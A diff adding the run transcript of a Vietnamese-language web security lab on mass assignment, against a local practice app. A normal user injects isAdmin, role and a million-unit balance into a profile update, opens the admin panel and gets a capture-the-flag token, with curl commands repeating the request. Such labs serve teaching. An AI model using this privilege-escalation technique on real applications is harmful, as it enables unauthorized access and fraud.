@@ -1,0 +1,28 @@
+# Transcript lab 5.4 - Mass assignment
+# App: python3 app.py  (127.0.0.1:8053)
+# Chay: python3 exploit.py
+# Ngay chay that: 2026-10-18 17:23:16
+# ============================================================
+
+[*] Buoc 1: dang nhap eve (user thuong)
+    profile truoc: {'balance': 0, 'bio': 'khach moi', 'email': 'eve@shop.local', 'isAdmin': False, 'ok': True, 'role': 'user'}
+
+[*] Thu vao /admin khi chua nang quyen (phai 403):
+    -> 403 {'error': '403 chi admin', 'ok': False}
+
+[*] Buoc 2: cap nhat profile, nhet them truong dac quyen
+    gui: {'email': 'eve@new.local', 'bio': 'toi chi doi email thoi ma', 'isAdmin': True, 'balance': 1000000, 'role': 'admin'}
+    profile sau: {'balance': 1000000, 'bio': 'toi chi doi email thoi ma', 'email': 'eve@new.local', 'isAdmin': True, 'ok': True, 'role': 'admin', 'updated': ['email', 'bio', 'isAdmin', 'balance', 'role']}
+
+[*] Buoc 3: truy cap /admin sau khi isAdmin=true
+    -> 200 {'balance': 1000000, 'flag': 'FLAG{5.4_mass_assignment_isAdmin_true}', 'ok': True, 'panel': 'admin'}
+
+[+] Nang quyen thanh cong qua mass assignment. FLAG = FLAG{5.4_mass_assignment_isAdmin_true}
+
+# --- Minh hoa them bang curl ---
+$ curl -s -X POST localhost:8053/login -d username=eve -d password=pw -c /tmp/j_5_4.txt
+{"ok":true,"user":"eve"}
+
+$ curl -s -X POST localhost:8053/api/profile -H 'Content-Type: application/json' -d '{"isAdmin":true}' -b /tmp/j_5_4.txt
+{"balance":1000000,"bio":"toi chi doi email thoi ma","email":"eve@new.local","isAdmin":true,"ok":true,"role":"admin","updated":["isAdmin"]}
+
